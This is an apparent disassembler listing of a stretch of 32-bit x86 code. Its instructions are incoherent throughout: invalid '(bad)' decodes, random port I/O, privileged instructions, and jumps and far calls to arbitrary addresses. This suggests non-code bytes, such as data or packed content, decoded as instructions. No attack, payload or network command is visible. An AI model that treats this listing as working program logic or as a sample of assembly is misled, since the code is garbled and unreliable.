  41fbdb:	and    esi,edi
  41fbdd:	ins    DWORD PTR es:[edi],dx
  41fbde:	push   es
  41fbdf:	dec    ebx
  41fbe0:	sub    eax,DWORD PTR [ecx]
  41fbe2:	adc    dh,BYTE PTR [edi-0x3745447e]
  41fbe8:	push   ebx
  41fbe9:	inc    esi
  41fbea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbeb:	adc    BYTE PTR [eax+0x43],bl
  41fbee:	cs pop esp
  41fbf0:	in     al,0x4b
  41fbf2:	add    al,0x0
  41fbf4:	pop    esp
  41fbf5:	dec    esp
  41fbf6:	pop    ebx
  41fbf7:	dec    ecx
  41fbf8:	sub    DWORD PTR [edi+ebp*1-0x43],edi
  41fbfc:	mov    dl,0xc4
  41fbfe:	cmc    
  41fbff:	jne    0x41fc1c
  41fc01:	arpl   WORD PTR [ebx],dx
  41fc03:	loope  0x41fbdd
  41fc05:	and    al,0xbd
  41fc07:	adc    bl,bh
  41fc09:	shl    ch,1
  41fc0b:	xchg   esp,eax
  41fc0c:	jg     0x41fc03
  41fc0e:	ror    edi,1
  41fc10:	les    eax,FWORD PTR [eax]
  41fc12:	in     eax,0xb3
  41fc14:	dec    ebx
  41fc15:	jae    0x41fc4c
  41fc17:	outs   dx,BYTE PTR ds:[esi]
  41fc18:	arpl   si,si
  41fc1a:	pop    ss
  41fc1b:	cwde   
  41fc1c:	mov    ds:0xa0dcade9,al
  41fc21:	ins    BYTE PTR es:[edi],dx
  41fc22:	js     0x41fba9
  41fc24:	sbb    eax,0x6dc74b0b
  41fc29:	mov    al,ds:0xb639dde8
  41fc2e:	or     ebx,DWORD PTR [edi]
  41fc30:	push   edi
  41fc31:	(bad)  
  41fc32:	out    0x59,eax
  41fc34:	test   DWORD PTR [edi-0x246e6246],0x2008ed38
  41fc3e:	or     esp,DWORD PTR [eax+0x1405e294]
  41fc44:	outs   dx,BYTE PTR ds:[esi]
  41fc45:	sub    BYTE PTR [eax],dl
  41fc47:	ja     0x41fcc1
  41fc49:	jmp    0x41fc2c
  41fc4b:	dec    esp
  41fc4c:	popf   
  41fc4d:	sti    
  41fc4e:	sahf   
  41fc4f:	add    BYTE PTR [ebx+0x6c],0x41
  41fc53:	mov    ah,0x6c
  41fc55:	mov    ds:0x1bb1520c,eax
  41fc5a:	test   DWORD PTR [ebp+0xe],0xb4e75b20
  41fc61:	pop    edx
  41fc62:	int    0xa4
  41fc64:	std    
  41fc65:	xor    DWORD PTR [ebp-0x5cac4a7],edx
  41fc6b:	xchg   edi,eax
  41fc6c:	push   eax
  41fc6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc6e:	and    edi,ebp
  41fc70:	jge    0x41fc41
  41fc72:	cmp    ah,BYTE PTR [edi]
  41fc74:	retf   
  41fc75:	jg     0x41fcb4
  41fc77:	imul   ebx,esi,0xb063419b
  41fc7d:	xchg   esi,eax
  41fc7e:	fcmovne st,st(2)
  41fc80:	xor    DWORD PTR [eax+0x1c],esp
  41fc83:	mov    edi,0xa60b3e3
  41fc88:	jno    0x41fc21
  41fc8a:	jno    0x41fc6e
  41fc8c:	ret    0x114f
  41fc8f:	or     cl,BYTE PTR [esi]
  41fc91:	jns    0x41fcab
  41fc93:	repz mov ?,WORD PTR [esi-0x7d]
  41fc97:	push   cs
  41fc98:	inc    ecx
  41fc99:	add    al,0x81
  41fc9b:	sub    edi,DWORD PTR [ebp-0x7a86db4d]
  41fca1:	xchg   ecx,eax
  41fca2:	xchg   edx,eax
  41fca3:	push   ss
  41fca4:	or     eax,0x9a679d06
  41fca9:	std    
  41fcaa:	push   0xffffff9c
  41fcac:	dec    ebx
  41fcad:	imul   esi,DWORD PTR [ebx-0x2f],0xffffffb3
  41fcb1:	push   edx
  41fcb2:	push   edx
  41fcb3:	mov    eax,0x1567a427
  41fcb8:	push   ds
  41fcb9:	dec    ebp
  41fcba:	sbb    esp,DWORD PTR [ebx+0x2a]
  41fcbd:	call   0x79a44d85
  41fcc2:	not    BYTE PTR [eax]
  41fcc4:	cmp    al,0x6f
  41fcc6:	and    esi,DWORD PTR [ebx]
  41fcc8:	(bad)  
  41fcc9:	stc    
  41fcca:	mov    esi,0x2a318a7f
  41fccf:	sti    
  41fcd0:	sar    esp,1
  41fcd2:	or     BYTE PTR [ebp-0xd],0x58
  41fcd6:	push   0xfffffff9
  41fcd8:	inc    ebp
  41fcd9:	jmp    0x41fc75
  41fcdb:	ror    DWORD PTR [ebp-0x6d515f21],0x4e
  41fce2:	lods   al,BYTE PTR ds:[esi]
  41fce3:	ss nop
  41fce5:	xchg   ebx,eax
  41fce6:	jnp    0x41fce5
  41fce8:	sub    edx,ebp
  41fcea:	mov    ch,0xeb
  41fcec:	shl    esi,cl
  41fcee:	lock or eax,0xd26467b5
  41fcf4:	sbb    BYTE PTR [ecx],al
  41fcf6:	das    
  41fcf7:	xchg   ecx,eax
  41fcf8:	fsubr  DWORD PTR [edx]
  41fcfa:	das    
  41fcfb:	div    BYTE PTR [eax+0x35]
  41fcfe:	in     eax,dx
  41fcff:	push   0x31d20fe4
  41fd04:	in     eax,dx
  41fd05:	adc    al,0x41
  41fd07:	(bad)  
  41fd08:	push   ecx
  41fd09:	fdiv   QWORD PTR [esi-0x26]
  41fd0c:	mov    bh,0x81
  41fd0e:	or     WORD PTR [edi],si
  41fd11:	mov    cl,0xdb
  41fd13:	cld    
  41fd14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd15:	cld    
  41fd16:	push   esi
  41fd17:	xchg   BYTE PTR [esi-0x5eaffbed],ah
  41fd1d:	call   0x65a68aec
  41fd22:	push   cs
  41fd23:	fldln2 
  41fd25:	sub    edi,0x2f
  41fd28:	inc    ecx
  41fd29:	sub    cl,bl
  41fd2b:	mov    cl,0xe
  41fd2d:	mov    esp,0xff660170
  41fd32:	mov    bl,0x72
  41fd34:	clc    
  41fd35:	xchg   ecx,eax
  41fd36:	push   edx
  41fd37:	popf   
  41fd38:	xlat   BYTE PTR ds:[ebx]
  41fd39:	add    bl,BYTE PTR [ecx-0x603bce21]
  41fd3f:	fyl2x  
  41fd41:	sub    eax,0x5df891be
  41fd46:	inc    edi
  41fd47:	cmp    al,0x3a
  41fd49:	adc    eax,0xa3106fe5
  41fd4e:	inc    ecx
  41fd4f:	sub    al,0x9e
  41fd51:	int3   
  41fd52:	fidiv  WORD PTR [esi-0x147e1155]
  41fd58:	inc    ebx
  41fd59:	sub    al,0xe1
  41fd5b:	dec    ebp
  41fd5c:	ins    DWORD PTR es:[edi],dx
  41fd5d:	sub    esi,DWORD PTR [eax]
  41fd5f:	push   edx
  41fd60:	cmp    BYTE PTR ds:0xa2df1e73,ch
  41fd66:	inc    esp
  41fd67:	into   
  41fd68:	std    
  41fd69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd6a:	or     bh,cl
  41fd6c:	in     al,0x86
  41fd6e:	cmp    BYTE PTR [esi+edx*2-0x7a3af1c2],0x7a
  41fd76:	test   DWORD PTR [eax-0xc],esi
  41fd79:	push   ebx
  41fd7a:	stos   DWORD PTR es:[edi],eax
  41fd7b:	arpl   WORD PTR [edi],bp
  41fd7d:	inc    ebp
  41fd7e:	add    DWORD PTR [ebx+edx*1-0x2584bfdf],ebx
  41fd85:	add    eax,0xe9e2d239
  41fd8a:	fisttp WORD PTR [esi+0x4c]
  41fd8d:	cs and ch,bl
  41fd90:	xchg   ecx,eax
  41fd91:	adc    edi,esp
  41fd93:	or     bh,bl
  41fd95:	loop   0x41fd57
  41fd97:	mov    eax,gs:0x31980e3a
  41fd9d:	xchg   ebx,eax
  41fd9e:	cmp    BYTE PTR [edi],bh
  41fda0:	mov    ebp,0xf1029001
  41fda5:	add    eax,0x55f6e190
  41fdaa:	pop    edx
  41fdab:	sub    eax,0x70acb62c
  41fdb0:	std    
  41fdb1:	and    eax,0x64414c81
  41fdb6:	mov    dh,0xa6
  41fdb8:	dec    ebp
  41fdb9:	sti    
  41fdba:	jle    0x41fd7f
  41fdbc:	mov    esp,0xf24d631a
  41fdc1:	ret    
  41fdc2:	ins    BYTE PTR es:[edi],dx
  41fdc3:	mov    ah,0x8c
  41fdc5:	dec    edi
  41fdc6:	add    bl,BYTE PTR [esi]
  41fdc8:	cmp    BYTE PTR [eax-0x4c9b7b5e],ch
  41fdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdcf:	std    
  41fdd0:	mov    ah,0x1b
  41fdd2:	add    ah,BYTE PTR ds:0x33002f97
  41fdd8:	daa    
  41fdd9:	dec    esi
  41fdda:	xchg   edx,eax
  41fddb:	(bad)  
  41fddd:	add    eax,0x17c50393
  41fde2:	test   esp,esi
  41fde4:	das    
  41fde5:	mov    bh,BYTE PTR [ebp+0x33bfb2f4]
  41fdeb:	fstp   QWORD PTR [ebx+0x4e]
  41fdee:	mov    edi,0x6a8cbef4
  41fdf3:	add    esi,ebx
  41fdf5:	inc    esi
  41fdf6:	mov    esi,0x58940d83
  41fdfb:	mov    ebx,0xb0c06a52
  41fe00:	out    0xb5,al
  41fe02:	hlt    
  41fe03:	popf   
  41fe04:	xor    DWORD PTR [eax-0xfcb8e07],edx
  41fe0a:	loope  0x41fe67
  41fe0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe0d:	dec    ecx
  41fe0e:	push   edx
  41fe0f:	xchg   edi,eax
  41fe10:	pop    esp
  41fe11:	ss jns 0x41fe5f
  41fe14:	push   ebp
  41fe15:	nop
  41fe16:	stc    
  41fe17:	pop    ebx
  41fe18:	sub    eax,0x63f072f9
  41fe1d:	jnp    0x41fe3c
  41fe1f:	and    al,0x7c
  41fe21:	mov    ds:0xae70bae0,eax
  41fe26:	rol    BYTE PTR [ebx+0x76],0xce
  41fe2a:	scas   eax,DWORD PTR es:[edi]
  41fe2b:	ins    BYTE PTR es:[edi],dx
  41fe2c:	jl     0x41fdd1
  41fe2e:	pop    esp
  41fe2f:	adc    al,0x9e
  41fe31:	sub    BYTE PTR [edi+0x7a],dh
  41fe34:	dec    ebp
  41fe35:	jne    0x41fde9
  41fe37:	adc    eax,DWORD PTR [edi]
  41fe39:	icebp  
  41fe3a:	mov    bh,0x97
  41fe3c:	jle    0x41fdd1
  41fe3e:	mov    edx,DWORD PTR [ecx-0x27e67115]
  41fe44:	pop    esp
  41fe45:	inc    edi
  41fe46:	inc    esp
  41fe47:	inc    ecx
  41fe48:	cs sbb eax,0x6403f189
  41fe4e:	push   esp
  41fe4f:	add    esp,DWORD PTR [esi+0x62320414]
  41fe55:	jne    0x41fe65
  41fe57:	clc    
  41fe58:	jmp    0xcf4c:0x7e0601ce
  41fe5f:	cmc    
  41fe60:	cmp    DWORD PTR [edx],ecx
  41fe62:	cdq    
  41fe63:	cwde   
  41fe64:	cmp    al,ah
  41fe66:	unpckhps xmm2,XMMWORD PTR [edi]
  41fe69:	push   0x3d
  41fe6b:	les    ecx,FWORD PTR [ecx-0x7b4969d8]
  41fe71:	pop    es
  41fe72:	or     ah,0x49
  41fe75:	mul    edi
  41fe77:	(bad)  [eax-0x63]
  41fe7a:	xchg   ebp,eax
  41fe7b:	and    BYTE PTR [ebx-0x72],al
  41fe7e:	sub    ah,ah
  41fe80:	fsub   DWORD PTR [edx+0x39]
  41fe83:	iret   
  41fe84:	or     edx,DWORD PTR [ecx-0x7a]
  41fe87:	ficom  DWORD PTR [ebx-0x1e]
  41fe8a:	rcl    DWORD PTR [ebp+0x6c],0x35
  41fe8e:	or     DWORD PTR [esi-0x26],eax
  41fe91:	in     eax,dx
  41fe92:	push   edx
  41fe93:	mov    bl,0xb4
  41fe95:	mov    cl,0x3
  41fe97:	jo     0x41fed7
  41fe99:	xchg   ebx,eax
  41fe9a:	aas    
  41fe9b:	fistp  QWORD PTR [eax-0x6949af5e]
  41fea1:	dec    ebp
  41fea2:	xlat   BYTE PTR ds:[ebx]
  41fea3:	stos   DWORD PTR es:[edi],eax
  41fea4:	int    0x19
  41fea6:	out    0x44,eax
  41fea8:	mov    al,0x26
  41feaa:	cmp    al,BYTE PTR [ecx+0x37]
  41fead:	and    DWORD PTR [ecx+0x14],eax
  41feb0:	cs sti 
  41feb2:	mov    bl,0x56
  41feb4:	bound  ecx,QWORD PTR [ebp+0x7d]
  41feb7:	call   FWORD PTR [esp+ebp*1+0x4f]
  41febb:	fdiv   st(5),st
  41febd:	mov    edx,0xf03148b7
  41fec2:	pop    ds
  41fec3:	cmc    
  41fec4:	adc    DWORD PTR [esi-0x63],0x971e1814
  41fecb:	jp     0x41fe82
  41fecd:	clc    
  41fece:	push   eax
  41fecf:	xlat   BYTE PTR ss:[ebx]
  41fed1:	fbld   TBYTE PTR [edi]
  41fed3:	push   edi
  41fed4:	mov    bl,0x5d
  41fed6:	test   al,0xca
  41fed8:	fiadd  DWORD PTR [edx+0x38]
  41fedb:	int    0x9f
  41fedd:	xchg   dl,al
  41fedf:	sbb    BYTE PTR [ecx-0x49],ch
  41fee2:	pop    edi
  41fee3:	sbb    al,0x15
  41fee5:	iret   
  41fee6:	mov    bh,BYTE PTR ds:0xdd202b63
  41feec:	push   ebx
  41feed:	dec    edi
  41feee:	dec    esi
  41feef:	jp     0x41fea7
  41fef1:	jl     0x41ff28
  41fef3:	push   ds
  41fef4:	pushaw 
  41fef6:	imul   esp,ecx,0xffffffa4
  41fef9:	xchg   esp,eax
  41fefa:	ins    DWORD PTR es:[edi],dx
  41fefb:	push   es
  41fefc:	dec    ecx
  41fefd:	dec    ebp
  41fefe:	add    DWORD PTR [edi+0xa],esp
  41ff01:	xchg   edi,eax
  41ff02:	sbb    al,0xde
  41ff04:	imul   esi,DWORD PTR [eax-0x24133f3d],0xe52babc9
  41ff0e:	adc    al,dl
  41ff10:	loopne 0x41fea0
  41ff12:	mov    ch,0xef
  41ff14:	ror    DWORD PTR [ecx+ebp*8-0x58],0xa1
  41ff19:	mov    eax,0x4341cd27
  41ff1e:	add    eax,ebp
  41ff20:	jns    0x41feb6
  41ff22:	mov    bl,0x1d
  41ff24:	es test al,0xc8
  41ff27:	mov    edx,0x61af26d7
  41ff2c:	fcmove st,st(4)
  41ff2e:	dec    esp
  41ff2f:	or     BYTE PTR [ebp-0x791027c0],ah
  41ff35:	rcr    DWORD PTR [eax],cl
  41ff37:	push   ebp
  41ff38:	rol    BYTE PTR [eax],0x9e
  41ff3b:	popa   
  41ff3c:	xor    BYTE PTR [ebx-0x1d16c7fa],ch
  41ff42:	xchg   esi,eax
  41ff43:	cld    
  41ff44:	(bad)
  41ff48:	test   BYTE PTR [edx],bh
  41ff4a:	enter  0x1c1b,0x62
  41ff4e:	xor    esi,edi
  41ff50:	les    edi,FWORD PTR [edi+0x484bec51]
  41ff56:	jmp    0x41ff09
  41ff58:	pop    esi
  41ff59:	push   edi
  41ff5a:	(bad)  
  41ff5b:	fsubr  DWORD PTR [edx+edi*4-0x35]
  41ff5f:	push   ebx
  41ff60:	js     0x41ff9b
  41ff62:	mov    esi,0xeefd7c96
  41ff67:	lea    ebx,[ebp+0x1e]
  41ff6a:	xor    BYTE PTR [eax-0x7570440c],dl
  41ff70:	in     al,dx
  41ff71:	push   0x27
  41ff73:	fistp  QWORD PTR [eax]
  41ff75:	(bad)  
  41ff76:	jl     0x41ffbf
  41ff78:	inc    ecx
  41ff79:	clc    
  41ff7a:	cmp    edi,DWORD PTR [edi+0x3a]
  41ff7d:	push   esp
  41ff7e:	out    0xdd,ax
  41ff81:	inc    edi
  41ff82:	inc    esi
  41ff83:	xchg   ebx,eax
  41ff84:	pop    ds
  41ff85:	pop    edx
  41ff86:	mov    esi,0xb0739752
  41ff8b:	aam    0xcf
  41ff8d:	(bad)  
  41ff8e:	xchg   edi,eax
  41ff8f:	inc    esi
  41ff90:	int    0x89
  41ff92:	jo     0x41ff9c
  41ff94:	int3   
  41ff95:	aaa    
  41ff96:	fild   DWORD PTR [ecx]
  41ff98:	pop    esi
  41ff99:	ins    BYTE PTR es:[edi],dx
  41ff9a:	mov    esi,0xe89f303c
  41ff9f:	sbb    dl,BYTE PTR [edi-0x15610abd]
  41ffa5:	out    dx,eax
  41ffa6:	jnp    0x420011
  41ffa8:	jbe    0x41ffd6
  41ffaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffab:	and    ebx,eax
  41ffad:	jbe    0x41ff92
  41ffaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffb0:	mov    BYTE PTR [ecx],bl
  41ffb2:	lds    ebx,FWORD PTR [esi]
  41ffb4:	imul   edi,ebp,0x3f
  41ffb7:	sub    esi,DWORD PTR cs:[esi-0x63]
  41ffbb:	mov    ebx,0xcd923b7e
  41ffc0:	mov    WORD PTR [esi-0x6c8dac0b],fs
  41ffc6:	mov    BYTE PTR [eax+0x1a],dl
  41ffc9:	sar    DWORD PTR [ecx-0x3d],1
  41ffcc:	inc    eax
  41ffce:	xchg   edi,eax
  41ffcf:	cs clc 
  41ffd1:	lahf   
  41ffd2:	mov    DWORD PTR [ebp-0x6b22fe6d],ebx
  41ffd8:	jmp    0xf0ad:0x4d066f36
  41ffdf:	jo     0x42002a
  41ffe1:	jae    0x420011
  41ffe3:	pusha  
  41ffe4:	cld    
  41ffe5:	add    BYTE PTR [edi-0x3f],ch
  41ffe8:	and    BYTE PTR [edi-0x3cae7d2f],cl
  41ffee:	cmp    dl,BYTE PTR [edi+0x61]
  41fff1:	iret   
  41fff2:	popf   
  41fff3:	test   al,0xb9
  41fff5:	mov    BYTE PTR [ebx+0x7e],ch
  41fff8:	sub    al,0x74
  41fffa:	sbb    bl,BYTE PTR ds:0xec208afb
  420000:	jne    0x42004f
  420002:	aaa    
  420003:	pop    esi
  420004:	outs   dx,DWORD PTR ds:[esi]
  420005:	je     0x41ff93
  420007:	les    ebp,FWORD PTR [eax]
  420009:	inc    DWORD PTR [esi-0x14f2e710]
  42000f:	loopne 0x420022
  420011:	rol    BYTE PTR [eax-0x45d07a17],cl
  420017:	addr16 retf 
  420019:	fild   DWORD PTR [edi]
  42001b:	xchg   ecx,eax
  42001c:	gs fs xchg esp,eax
  42001f:	xchg   BYTE PTR [edx+ebx*8-0x5a7c444b],dl
  420026:	mov    al,0x49
  420028:	mov    BYTE PTR [ebx-0x58f954f6],dl
  42002e:	stc    
  42002f:	jae    0x42009b
  420031:	jp     0x420028
  420033:	shl    BYTE PTR [eax+0x4e653fcb],0xca
  42003a:	icebp  
  42003b:	ins    DWORD PTR es:[edi],dx
  42003c:	lods   eax,DWORD PTR ds:[esi]
  42003d:	je     0x42003c
  42003f:	pop    ebp
  420040:	fwait
  420041:	repnz pusha 
  420043:	push   es
  420044:	adc    ch,BYTE PTR [esp+esi*1-0x75]
  420048:	xor    DWORD PTR [edi],esi
  42004a:	imul   eax,DWORD PTR ds:0xbae0ba90,0x196bab16
  420054:	mov    al,0x8
  420056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420057:	in     eax,dx
  420058:	inc    esp
  420059:	int    0xa9
  42005b:	test   eax,0x215bef33
  420060:	push   ecx
  420061:	or     dh,BYTE PTR [edi]
  420063:	jo     0x4200a3
  420065:	inc    ebp
  420066:	sub    ebp,DWORD PTR [eax+edi*2+0x7c]
  42006a:	lgdtd  [ebx+0x24762b5d]
  420071:	rol    dh,0x77
  420074:	fs jnp 0x4200d5
  420077:	into   
  420078:	leave  
  420079:	jno    0x42004b
  42007b:	or     esp,ebx
  42007d:	push   ebx
  42007e:	data16 mov al,ds:0xe1d6d5af
  420084:	fist   WORD PTR ds:0x82415799
  42008a:	popa   
  42008b:	jle    0x4200bc
  42008d:	inc    esp
  42008e:	(bad)  [ebx]
  420090:	push   ebp
  420091:	cmp    eax,0x63413ae3
  420096:	xor    al,0x28
  420098:	adc    DWORD PTR [ecx-0x408ee904],ecx
  42009e:	pop    es
  42009f:	sub    BYTE PTR [esi-0x856b14c],bh
  4200a5:	jle    0x42009f
  4200a7:	push   ecx
  4200a8:	dec    DWORD PTR [eax+0x3a79b14e]
  4200ae:	out    dx,al
  4200af:	mov    esi,0x45fe4577
  4200b4:	or     bh,BYTE PTR [ebx]
  4200b6:	xchg   ebp,eax
  4200b7:	lock mov edx,0x65d08474
  4200bd:	mov    ch,0xe4
  4200bf:	fnstcw WORD PTR [ecx-0x5b]
  4200c2:	iret   
  4200c3:	mov    ds:0xb4fff791,eax
  4200c8:	into   
  4200c9:	sbb    edx,esp
  4200cb:	pop    ebx
  4200cc:	pusha  
  4200cd:	adc    al,0xe2
  4200cf:	mov    ds:0x868295e,al
  4200d4:	push   ebx
  4200d5:	mov    ah,0x7b
  4200d7:	or     al,dl
  4200d9:	js     0x420130
  4200db:	sub    eax,0x30070a3
  4200e0:	mov    dl,0x81
  4200e2:	jmp    0x931ae002
  4200e7:	dec    ecx
  4200e8:	ror    DWORD PTR [ebp-0x1e],cl
  4200eb:	inc    esi
  4200ec:	(bad)  
  4200ed:	cld    
  4200ee:	inc    ebx
  4200ef:	outs   dx,DWORD PTR ds:[esi]
  4200f0:	jg     0x42007c
  4200f2:	outs   dx,DWORD PTR ds:[esi]
  4200f3:	adc    DWORD PTR [eax+0x162c034f],0x98fcd35a
  4200fd:	dec    edi
  4200fe:	jmp    0xeae53b73
  420103:	inc    esi
  420104:	push   cs
  420105:	jns    0x4200f4
  420107:	and    eax,0x8aca8e26
  42010c:	mov    bl,BYTE PTR [ebx]
  42010e:	push   cs
  42010f:	mov    cl,0x3c
  420111:	clc    
  420112:	es add eax,0xd82fc4e7
  420118:	and    DWORD PTR [eax+0x3862cf41],eax
  42011e:	test   al,0x84
  420120:	mov    es,esi
  420122:	inc    eax
  420123:	inc    ebp
  420124:	aam    0x3a
  420126:	outs   dx,BYTE PTR ds:[esi]
  420127:	push   ss
  420128:	jo     0x420180
  42012a:	xchg   ebp,eax
  42012b:	int3   
  42012c:	adc    ecx,DWORD PTR [ecx]
  42012e:	es mov cl,0x26
  420131:	and    DWORD PTR [esi+esi*2+0x5fb04886],edi
  420138:	jmp    DWORD PTR ds:0xa9644a19
  42013e:	dec    edi
  42013f:	and    DWORD PTR [ebp+0x7d1f264],0xf205fce
  420149:	sub    al,0x62
  42014b:	shr    DWORD PTR [edi+0x7798f62a],1
  420151:	popa   
  420152:	jle    0x420198
  420154:	in     al,dx
  420155:	into   
  420156:	fmul   DWORD PTR [edi-0x659d628e]
  42015c:	out    0x61,al
  42015e:	mov    cl,0x17
  420160:	xchg   ebp,eax
  420161:	inc    edx
  420162:	mov    ecx,0xbc38ca6f
  420167:	jae    0x42011c
  420169:	jb     0x4200ff
  42016b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42016c:	dec    ebx
  42016d:	inc    esp
  42016e:	sub    ebp,ebp
  420170:	cmc    
  420171:	push   0xd4766776
  420176:	or     eax,0x6a6f03a3
  42017b:	loope  0x42018c
  42017d:	and    BYTE PTR [eax],bh
  42017f:	cmp    DWORD PTR [edi],ebp
  420181:	cwde   
  420182:	in     al,dx
  420183:	cmp    DWORD PTR [ecx-0x4f],esp
  420186:	lock das 
  420188:	popf   
  420189:	cld    
  42018a:	repnz mov ebp,0xc86ace61
  420190:	jle    0x4201bf
  420192:	xor    al,0xca
  420194:	retf   
  420195:	and    eax,0xae2c3db7
  42019a:	outs   dx,DWORD PTR ds:[esi]
  42019b:	jmp    0x4201d8
  42019d:	scas   al,BYTE PTR es:[edi]
  42019e:	push   esi
  42019f:	sub    eax,0x8f738d3c
  4201a4:	ja     0x420161
  4201a6:	(bad)  
  4201a7:	fsubr  DWORD PTR [eax+0x15db4c81]
  4201ad:	jb     0x420220
  4201af:	push   ecx
  4201b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201b1:	mov    ah,0x78
  4201b3:	mov    ds:0xba356498,al
  4201b8:	push   edx
  4201b9:	mov    ebp,0x79782f70
  4201be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201bf:	enter  0x2b2c,0x1f
  4201c3:	adc    eax,0xfff3848
  4201c8:	jns    0x420237
  4201ca:	in     eax,0xfe
  4201cc:	inc    ebx
  4201cd:	xchg   ebp,eax
  4201ce:	xchg   esi,eax
  4201cf:	loope  0x42018d
  4201d1:	dec    esp
  4201d2:	cmp    ecx,0x32
  4201d5:	sbb    ebx,DWORD PTR [edi+0x28]
  4201d8:	or     ch,ch
  4201da:	jb     0x4201d7
  4201dc:	loopne 0x420211
  4201de:	cmp    ch,BYTE PTR [ebp-0x50]
  4201e1:	xchg   bh,bl
  4201e3:	test   DWORD PTR [eax+0x38aeb523],ebp
  4201e9:	loop   0x42017c
  4201eb:	std    
  4201ec:	stos   BYTE PTR es:[edi],al
  4201ed:	ss ds rol eax,cl
  4201f1:	add    al,0x7e
  4201f3:	pop    edi
  4201f4:	ins    DWORD PTR es:[edi],dx
  4201f5:	aam    0xf9
  4201f7:	outs   dx,DWORD PTR ds:[esi]
  4201f8:	mov    ds:0x45af2eaa,eax
  4201fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201fe:	or     al,0xc6
  420200:	fstp   TBYTE PTR cs:[ebx+ebx*2-0x20df729b]
  420208:	mov    dh,0xfc
  42020a:	sub    al,0x45
  42020c:	pop    ebx
  42020d:	push   esp
  42020e:	inc    esi
  42020f:	popa   
  420210:	test   BYTE PTR ds:0xd3cc5ab,bl
  420216:	popa   
  420217:	add    esp,ebp
  420219:	jno    0x42020e
  42021b:	or     al,0x0
  42021d:	je     0x42028b
  42021f:	sub    eax,0xca4ae08d
  420224:	aas    
  420225:	rcr    DWORD PTR [edi+0x1c],1
  420228:	lea    esi,[ebp-0x2c20acfb]
  42022e:	pop    edx
  42022f:	mov    edi,0xe942c8d6
  420234:	bound  esi,QWORD PTR [edi]
  420236:	jle    0x4201f3
  420238:	xor    ebp,DWORD PTR [edi-0x22]
  42023b:	scas   eax,DWORD PTR es:[edi]
  42023c:	push   eax
  42023d:	sbb    al,0xbb
  42023f:	inc    esi
  420240:	push   0x2a353404
  420245:	inc    eax
  420246:	ja     0x4201d6
  420248:	out    dx,al
  420249:	hlt    
  42024a:	push   ebx
  42024b:	sub    ch,BYTE PTR [ebx-0xc]
  42024e:	xchg   edx,eax
  42024f:	jno    0x420227
  420251:	push   esi
  420252:	sbb    DWORD PTR [edi+0x4a],esp
  420255:	loopne 0x420263
  420257:	jl     0x4202c1
  420259:	jb     0x4201f6
  42025b:	neg    BYTE PTR [eax]
  42025d:	repnz rcl DWORD PTR [ecx+esi*4+0x10ebded6],cl
  420265:	ror    BYTE PTR [edx-0x32ba95d0],0x44
  42026c:	or     DWORD PTR [edx+0x7586c9e1],ebp
  420272:	or     edi,DWORD PTR [ebx+0x78]
  420275:	pop    es
  420276:	popa   
  420277:	pop    esi
  420278:	lods   eax,DWORD PTR ds:[esi]
  420279:	cdq    
  42027a:	add    ebp,0xffffff8d
  42027d:	pusha  
  42027e:	pop    ebp
  42027f:	and    BYTE PTR ds:0x4fc25b7f,0xf
  420286:	pop    es
  420287:	fdivr  DWORD PTR [eax]
  420289:	pusha  
  42028a:	(bad)  
  42028b:	cs leave 
  42028d:	jecxz  0x420235
  42028f:	inc    esp
  420290:	adc    esi,DWORD PTR [ebx-0x32]
  420293:	lahf   
  420294:	dec    eax
  420295:	(bad)  
  420296:	std    
  420297:	inc    eax
  420298:	imul   ebx,DWORD PTR [edi-0x20b262c7],0x14bae525
  4202a2:	inc    BYTE PTR ds:0x6ea8fa22
  4202a8:	data16 scas al,BYTE PTR es:[edi]
  4202aa:	int3   
  4202ab:	(bad)  
  4202ad:	or     ebx,edx
  4202af:	lods   al,BYTE PTR ds:[esi]
  4202b0:	and    BYTE PTR [ecx-0x7b52345f],ch
  4202b6:	mov    al,0xf3
  4202b8:	rcl    DWORD PTR [esi],0x36
  4202bb:	bndldx (bad),[ebx+0x5a9243ca]
  4202c2:	push   es
  4202c3:	and    BYTE PTR [esp+eax*2],dh
  4202c6:	add    BYTE PTR [edx],bl
  4202c8:	in     al,0x73
  4202ca:	(bad)  
  4202cb:	stc    
  4202cc:	mov    ebp,0x21de1fcc
  4202d1:	jmp    0x42034c
  4202d3:	ins    DWORD PTR es:[edi],dx
  4202d4:	fdiv   QWORD PTR [ecx+0x30]
  4202d7:	mov    esp,0x33155098
  4202dc:	xchg   al,cl
  4202de:	rcl    DWORD PTR ds:0x17957006,cl
  4202e4:	push   edx
  4202e5:	add    edi,esp
  4202e7:	xor    ch,BYTE PTR [ebx+ebp*2-0xf140a57]
  4202ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202ef:	cs xchg ebx,eax
  4202f1:	mov    ds:0x58561ad8,al
  4202f6:	mov    ch,0x10
  4202f8:	cld    
  4202f9:	fcom   st(2)
  4202fb:	jl     0x420307
  4202fd:	rol    ebp,0x15
  420300:	dec    eax
  420301:	gs dec ebx
  420303:	sahf   
  420304:	push   esp
  420305:	xchg   ebx,eax
  420306:	xchg   esp,eax
  420307:	ins    DWORD PTR es:[edi],dx
  420308:	aad    0x4c
  42030a:	dec    eax
  42030b:	push   cs
  42030c:	cmp    eax,0xc37636b
  420311:	adc    eax,DWORD PTR [edi-0x72]
  420314:	lods   al,BYTE PTR ds:[esi]
  420315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420316:	loope  0x4202aa
  420318:	retf   
  420319:	inc    ecx
  42031b:	shr    DWORD PTR [edx+0x3f4e2bd8],1
  420321:	and    al,0x5d
  420323:	sub    al,0x61
  420325:	loope  0x42030f
  420327:	aaa    
  420328:	cdq    
  420329:	sbb    ch,BYTE PTR [ecx+0x17d87637]
  42032f:	call   0x43b0:0x835f9fba
